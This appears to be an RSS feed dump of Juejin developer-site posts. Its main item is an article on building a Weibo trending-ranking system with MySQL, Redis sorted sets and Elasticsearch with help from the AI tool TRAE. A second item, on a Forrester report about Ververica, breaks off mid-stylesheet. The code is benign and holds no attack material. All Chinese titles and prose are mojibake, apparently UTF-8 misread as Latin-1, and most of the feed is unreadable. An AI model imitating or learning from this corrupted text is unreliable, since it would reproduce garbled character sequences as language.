<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>æ˜é‡‘æ–‡ç« æ¨è</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>ä¸€ä¸ªå¸®åŠ©å¼€å‘è€…æˆé•¿çš„ç¤¾åŒº</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[ğŸš€ ç”¨ TRAE æ„å»ºé«˜æ€§èƒ½ã€Œå¾®åšçƒ­ç‚¹æ’è¡Œæ¦œã€ç³»ç»Ÿï¼šES + Redis + MySQL å®æˆ˜è½åœ°]]></title>    <link>https://juejin.cn/post/7581728606308270132</link>    <guid>https://juejin.cn/post/7581728606308270132</guid>    <pubDate>2025-12-10T01:47:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581728606308270132" data-draft-id="7581728606308253748" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸš€ ç”¨ TRAE æ„å»ºé«˜æ€§èƒ½ã€Œå¾®åšçƒ­ç‚¹æ’è¡Œæ¦œã€ç³»ç»Ÿï¼šES + Redis + MySQL å®æˆ˜è½åœ°"/> <meta itemprop="keywords" content="Trae"/> <meta itemprop="datePublished" content="2025-12-10T01:47:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤©å¤©æ‘¸é±¼çš„javaå·¥ç¨‹å¸ˆ"/> <meta itemprop="url" content="https://juejin.cn/user/3109843365802925"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸš€ ç”¨ TRAE æ„å»ºé«˜æ€§èƒ½ã€Œå¾®åšçƒ­ç‚¹æ’è¡Œæ¦œã€ç³»ç»Ÿï¼šES + Redis + MySQL å®æˆ˜è½åœ°
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3109843365802925/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤©å¤©æ‘¸é±¼çš„javaå·¥ç¨‹å¸ˆ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T01:47:20.000Z" title="Wed Dec 10 2025 01:47:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ğŸš€ ç”¨ TRAE æ„å»ºé«˜æ€§èƒ½ã€Œå¾®åšçƒ­ç‚¹æ’è¡Œæ¦œã€ç³»ç»Ÿï¼šES + Redis + MySQL å®æˆ˜è½åœ°</h2>
<blockquote>
<p>âœï¸ ä½œè€…ï¼šå¤©å¤©æ‘¸é±¼çš„javaå·¥ç¨‹å¸ˆ<br/>
ğŸ“Œ æ ‡ç­¾ï¼š#å¾®åšçƒ­æ¦œç³»ç»Ÿ #ESå®æ—¶æœç´¢ #Redisæ’è¡Œæ¦œ #Javaæ¶æ„å®æˆ˜ #é«˜æ€§èƒ½ç³»ç»Ÿ #AIè¾…åŠ©å¼€å‘</p>
</blockquote>
<hr/>
<h3 data-id="heading-1">ğŸ§  èµ·å› ï¼šå¾®åšçƒ­æ¦œï¼Œä¸ºä»€ä¹ˆå€¼å¾—åšï¼Ÿ</h3>
<p>ä½œä¸ºä¸€ä¸ªåç«¯å·¥ç¨‹å¸ˆï¼Œæˆ‘ä¸€ç›´å¯¹ã€Œçƒ­ç‚¹å†…å®¹å®æ—¶ç»Ÿè®¡ç³»ç»Ÿã€æƒ…æœ‰ç‹¬é’Ÿã€‚</p>
<p>æ¯”å¦‚å¾®åšçƒ­æœã€çŸ¥ä¹çƒ­æ¦œã€Bç«™é£äº‘æ¦œ...è¿™äº›æ¦œå•èƒŒåï¼Œéƒ½æ˜¯<strong>è¶…é«˜å¹¶å‘ + å®æ—¶ç»Ÿè®¡ + å¤šå±‚ç¼“å­˜ + å¤šæºæ•°æ®</strong>çš„æŠ€æœ¯æŒ‘æˆ˜ã€‚</p>
<p>è¿™æ¬¡è¶ç€å‚åŠ  <strong>TRAE SOLO å¤§èµ›çš„å¥‘æœº</strong>ï¼Œæˆ‘å°è¯•ç”¨ TRAE æ„å»ºä¸€ä¸ªï¼š</p>
<blockquote>
<p><strong>é«˜æ€§èƒ½ã€å¯æ‰©å±•ã€æ”¯æŒå®æ—¶æ›´æ–°çš„ã€Œå¾®åšçƒ­ç‚¹æ’è¡Œæ¦œç³»ç»Ÿã€</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-2">ğŸ¯ ç³»ç»Ÿç›®æ ‡</h3>
<p>åœ¨è¿™ä¸ªç³»ç»Ÿä¸­ï¼Œæˆ‘å¸Œæœ›å®ç°ï¼š</p>
<ul>
<li>âœ… å¾®åšæ¯æ¡å†…å®¹éƒ½æœ‰ç‹¬ç«‹ IDï¼ˆ<code>mid</code>ï¼‰</li>
<li>âœ… çƒ­åº¦å˜åŒ–å®æ—¶ç»Ÿè®¡ï¼ˆé˜…è¯»æ•°ã€ç‚¹èµæ•°ã€è¯„è®ºæ•°ç­‰ï¼‰</li>
<li>âœ… æ”¯æŒæŒ‰æ—¶é—´ç»´åº¦ï¼ˆå°æ—¶ã€å¤©ï¼‰ç»Ÿè®¡</li>
<li>âœ… æ’è¡Œæ¦œæ”¯æŒåˆ†é¡µã€æœç´¢ã€å…³é”®è¯ç­›é€‰</li>
<li>âœ… çƒ­æ¦œæ•°æ®ç§’çº§æ›´æ–°ï¼Œæ¯«ç§’çº§è¯»å–</li>
</ul>
<hr/>
<h3 data-id="heading-3">ğŸ§± è¡¨ç»“æ„è®¾è®¡ï¼šMySQL + Redis + ES ä¸‰å±‚ä½“ç³»</h3>
<h4 data-id="heading-4">1. æ•°æ®åº“å»ºè¡¨ï¼ˆMySQLï¼‰</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `weibo_post` (
  `id` <span class="hljs-type">BIGINT</span> <span class="hljs-keyword">PRIMARY</span> KEY AUTO_INCREMENT,
  `mid` <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">64</span>) <span class="hljs-keyword">UNIQUE</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
  `content` TEXT,
  `author` <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">64</span>),
  `like_count` <span class="hljs-type">INT</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-number">0</span>,
  `comment_count` <span class="hljs-type">INT</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-number">0</span>,
  `read_count` <span class="hljs-type">BIGINT</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-number">0</span>,
  `created_at` DATETIME,
  `updated_at` DATETIME
);
</code></pre>
<p>â³ è¯´æ˜ï¼š</p>
<ul>
<li>æ ¸å¿ƒå­—æ®µä¸º <code>mid</code>ï¼ˆå¾®åšIDï¼‰ï¼Œå†…å®¹å­˜å‚¨åœ¨ <code>content</code></li>
<li>åŸºç¡€æ•°æ®å…¥åº“ï¼Œç”¨äºæŒä¹…åŒ–å’Œç¦»çº¿ç»Ÿè®¡</li>
</ul>
<hr/>
<h4 data-id="heading-5">2. å®æ—¶çƒ­åº¦ç»Ÿè®¡ï¼ˆRedisï¼‰</h4>
<ul>
<li>ä½¿ç”¨ Redis çš„ <strong>ZSetï¼ˆæœ‰åºé›†åˆï¼‰</strong> å­˜å‚¨çƒ­æ¦œï¼š</li>
</ul>
<pre><code class="hljs language-arduino" lang="arduino">zadd weibo:hot:today <span class="hljs-number">1001234</span> <span class="hljs-string">"mid_123"</span>
zadd weibo:hot:today <span class="hljs-number">1009823</span> <span class="hljs-string">"mid_456"</span>
</code></pre>
<ul>
<li><code>Score</code> è®¡ç®—æ–¹å¼ï¼š</li>
</ul>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">score</span> = readCount * <span class="hljs-number">1</span> + likeCount * <span class="hljs-number">20</span> + commentCount * <span class="hljs-number">50</span>
</code></pre>
<ul>
<li>æ¯æ¬¡ç‚¹èµ/è¯„è®º/é˜…è¯»æ—¶ï¼Œå¼‚æ­¥æ›´æ–°å¯¹åº” <code>mid</code> çš„ scoreã€‚</li>
</ul>
<p>ğŸ”¥ Redis ä¼˜åŠ¿ï¼š</p>
<ul>
<li>æ¯«ç§’çº§æ›´æ–°</li>
<li>å†…å­˜æ“ä½œè¶…å¿«</li>
<li>æ’åºã€åˆ†é¡µã€TopN æŸ¥è¯¢æå…¶é«˜æ•ˆ</li>
</ul>
<hr/>
<h4 data-id="heading-6">3. æœç´¢èƒ½åŠ›ï¼ˆElasticsearchï¼‰</h4>
<p>å¾®åšå†…å®¹éœ€è¦æ”¯æŒå…³é”®è¯æœç´¢ã€å…¨æ–‡æ£€ç´¢ï¼Œäºæ˜¯æˆ‘ä½¿ç”¨äº† <strong>ES 7.x</strong>ï¼š</p>
<pre><code class="hljs language-css" lang="css">PUT weibo_index
{
  "mappings": {
    "properties": {
      "mid": { "type": <span class="hljs-string">"keyword"</span> },
      "<span class="hljs-attribute">content</span>": { "type": <span class="hljs-string">"text"</span>, <span class="hljs-string">"analyzer"</span>: <span class="hljs-string">"ik_max_word"</span> },
      "author": { "type": <span class="hljs-string">"keyword"</span> },
      "created_at": { "type": <span class="hljs-string">"date"</span> }
    }
  }
}
</code></pre>
<ul>
<li>æ”¯æŒå…³é”®è¯æœç´¢ï¼š<code>match</code>, <code>term</code>, <code>bool</code></li>
<li>æ”¯æŒåˆ†é¡µã€é«˜äº®ã€ç›¸å…³åº¦æ’åº</li>
<li>çƒ­æ¦œé¡µé¢æ”¯æŒå…¨æ–‡æœç´¢ + çƒ­åº¦æ’åºç»¼åˆå±•ç¤º</li>
</ul>
<hr/>
<h3 data-id="heading-7">âš™ï¸ æ¶æ„è®¾è®¡ï¼ˆå›¾è§£ï¼‰</h3>
<pre><code class="hljs language-markdown" lang="markdown">ç”¨æˆ·è¡Œä¸ºï¼ˆé˜…è¯»/ç‚¹èµ/è¯„è®ºï¼‰
<span class="hljs-code">        â†“
   Kafka æ—¥å¿—æµï¼ˆå¯é€‰ï¼‰
        â†“
     Redis ZSet çƒ­æ¦œæ›´æ–°ï¼ˆå®æ—¶ï¼‰
        â†“
    å®šæ—¶ä»»åŠ¡å®šæœŸå†™å…¥ MySQL
        â†“
     Elasticsearch å®æ—¶æœç´¢æ”¯æŒ
        â†“
     API æ¥å£è¿”å›çƒ­æ¦œæ•°æ®
</span></code></pre>
<hr/>
<h3 data-id="heading-8">ğŸ”¥ çƒ­æ¦œæ¥å£æ ¸å¿ƒé€»è¾‘</h3>
<h4 data-id="heading-9">æŸ¥è¯¢ Redis çƒ­æ¦œ Top N</h4>
<pre><code class="hljs language-ini" lang="ini">Set&lt;String&gt; <span class="hljs-attr">mids</span> = redisTemplate.opsForZSet()
    .reverseRange("weibo:hot:today", 0, 99)<span class="hljs-comment">;</span>
</code></pre>
<h4 data-id="heading-10">æ‰¹é‡æŸ¥è¯¢å¾®åšå†…å®¹ï¼ˆMySQL æˆ– ESï¼‰</h4>
<pre><code class="hljs language-ini" lang="ini">List&lt;WeiboPost&gt; <span class="hljs-attr">posts</span> = weiboRepository.findByMidIn(mids)<span class="hljs-comment">;</span>
</code></pre>
<p>æˆ–è€…ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// ES æŸ¥è¯¢ + Score æ’åº</span>
QueryBuilder query = QueryBuilders.<span class="hljs-built_in">idsQuery</span>().<span class="hljs-built_in">addIds</span>(mids.<span class="hljs-built_in">toArray</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">String</span>[<span class="hljs-number">0</span>]));
</code></pre>
<hr/>
<h3 data-id="heading-11">ğŸ§  TRAE çš„ä½œç”¨ï¼šAI + æ¶æ„ååŒè®¾è®¡</h3>
<p>æˆ‘åœ¨ TRAE SOLO ä¸­æå‡ºå¦‚ä¸‹ Promptï¼š</p>
<pre><code class="hljs">è¯·å¸®æˆ‘å®ç°ä¸€ä¸ªå¾®åšçƒ­æ¦œç³»ç»Ÿï¼Œæ”¯æŒæŒ‰çƒ­åº¦å®æ—¶æ’è¡Œï¼Œæ•°æ®æ¥æº Redis + MySQL + Elasticsearchï¼Œæä¾›æŸ¥è¯¢æ¥å£ï¼Œæ”¯æŒåˆ†é¡µæœç´¢ã€‚
</code></pre>
<p>TRAE å¾ˆå¿«å¸®æˆ‘ï¼š</p>
<ul>
<li>ç”Ÿæˆäº† Redis çƒ­ç‚¹ç»Ÿè®¡çš„æ¨¡æ¿ä»£ç </li>
<li>Elasticsearch æ˜ å°„ç»“æ„ + æŸ¥è¯¢æ–¹å¼</li>
<li>çƒ­æ¦œåˆ†é¡µæŸ¥è¯¢æ¥å£éª¨æ¶</li>
<li>çƒ­åº¦ score çš„è®¡ç®—æ¨¡å‹å»ºè®®</li>
<li>æ•°æ®æŒä¹…åŒ–ç­–ç•¥ï¼ˆå®šæ—¶å†™ MySQLï¼‰</li>
</ul>
<p>è¿™ä¸€åˆ‡èŠ‚çœäº†æˆ‘ 60% çš„ç¼–ç æ—¶é—´ï¼</p>
<hr/>
<h3 data-id="heading-12">ğŸ§ª å®æµ‹æ•ˆæœ</h3>
<p>æˆ‘ä½¿ç”¨ 10w æ¡æ¨¡æ‹Ÿå¾®åšæ•°æ®ï¼Œåœ¨æœ¬åœ°æµ‹è¯•å¦‚ä¸‹ï¼š</p>
<ul>
<li>ğŸ‘ ç‚¹èµ/è¯„è®º/é˜…è¯»å¹¶å‘æ‰“ç‚¹ï¼šQPS 1500+</li>
<li>ğŸ”¥ Redis çƒ­æ¦œæ›´æ–°å»¶è¿Ÿï¼š&lt; 5ms</li>
<li>ğŸ” çƒ­æ¦œ Top100 æŸ¥è¯¢ï¼š&lt; 20ms</li>
<li>ğŸ” å…³é”®è¯ + çƒ­åº¦æŸ¥è¯¢ï¼šES æŸ¥è¯¢ &lt; 100ms</li>
</ul>
<hr/>
<h3 data-id="heading-13">ğŸ”§ å¯æ‰©å±•æ€§è®¾è®¡</h3>





























<table><thead><tr><th>åŠŸèƒ½æ¨¡å—</th><th>æ‰©å±•æ–¹å‘</th></tr></thead><tbody><tr><td>Redis çƒ­æ¦œ</td><td>å¤šç»´åº¦æ’è¡Œæ¦œï¼ˆæŒ‰åŸå¸‚ã€è¯é¢˜ï¼‰</td></tr><tr><td>Elasticsearch</td><td>æ”¯æŒæœç´¢è”æƒ³ã€è¯­ä¹‰åˆ†è¯ã€å‘é‡æ£€ç´¢</td></tr><tr><td>Kafka</td><td>ç”¨æˆ·è¡Œä¸ºå¼‚æ­¥å…¥æµï¼Œæ”¯æŒå®æ—¶æ•°ä»“</td></tr><tr><td>æ•°æ®è½ç›˜</td><td>ä½¿ç”¨ Flink + ClickHouse å®æ—¶èšåˆ</td></tr><tr><td>æ¥å£å±‚</td><td>æ”¯æŒ GraphQL æŸ¥è¯¢ï¼Œå‰ç«¯è‡ªç”±ç»„åˆ</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-14">âœ… æ€»ç»“ï¼šç”¨ AI + å…«å¹´ç»éªŒï¼Œæ‰“é€ ä¸€æ¬¾å·¥ç¨‹çº§çƒ­æ¦œç³»ç»Ÿ</h3>
<p>è¿™æ¬¡æˆ‘ç”¨ TRAE SOLO æ„å»ºäº†ä¸€ä¸ªå®Œæ•´çš„ã€Œå¾®åšçƒ­æ¦œã€ç³»ç»Ÿï¼Œå®ƒä¸ä»…ä»…æ˜¯ä¸€ä¸ªæŠ€æœ¯ Demoï¼Œæ›´æ˜¯ä¸€ä¸ª <strong>å¯éƒ¨ç½²ã€å¯æ‰©å±•ã€å¯è¿ç»´çš„å·¥ç¨‹åŒ–äº§å“åŸå‹</strong>ã€‚</p>
<ul>
<li>ğŸ“¦ ä½¿ç”¨ä¸»æµç»„ä»¶ï¼šRedisã€MySQLã€Elasticsearch</li>
<li>ğŸ§  ç»“åˆ AI å’Œäººç±»æ¶æ„æ€ç»´</li>
<li>âš™ï¸ å®ç°å®æ—¶ã€é«˜æ€§èƒ½æ’è¡Œæ¦œæœåŠ¡</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Forresterå‘å¸ƒæµå¼æ•°æ®å¹³å°æŠ¥å‘Šï¼šVervericaé¦–æ¬¡è·»èº«é¢†å¯¼è€…è¡Œåˆ—ï¼Œå®æ—¶AIèƒ½åŠ›è·æƒå¨è®¤å¯]]></title>    <link>https://juejin.cn/post/7582401182933909519</link>    <guid>https://juejin.cn/post/7582401182933909519</guid>    <pubDate>2025-12-11T09:27:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582401182933909519" data-draft-id="7582358932028014607" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Forresterå‘å¸ƒæµå¼æ•°æ®å¹³å°æŠ¥å‘Šï¼šVervericaé¦–æ¬¡è·»èº«é¢†å¯¼è€…è¡Œåˆ—ï¼Œå®æ—¶AIèƒ½åŠ›è·æƒå¨è®¤å¯"/> <meta itemprop="keywords" content="Flink,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-12-11T09:27:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿é‡Œäº‘å¤§æ•°æ®AIæŠ€æœ¯"/> <meta itemprop="url" content="https://juejin.cn/user/2414974667341287"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Forresterå‘å¸ƒæµå¼æ•°æ®å¹³å°æŠ¥å‘Šï¼šVervericaé¦–æ¬¡è·»èº«é¢†å¯¼è€…è¡Œåˆ—ï¼Œå®æ—¶AIèƒ½åŠ›è·æƒå¨è®¤å¯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2414974667341287/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿é‡Œäº‘å¤§æ•°æ®AIæŠ€æœ¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-11T09:27:47.000Z" title="Thu Dec 11 2025 09:27:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-11
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 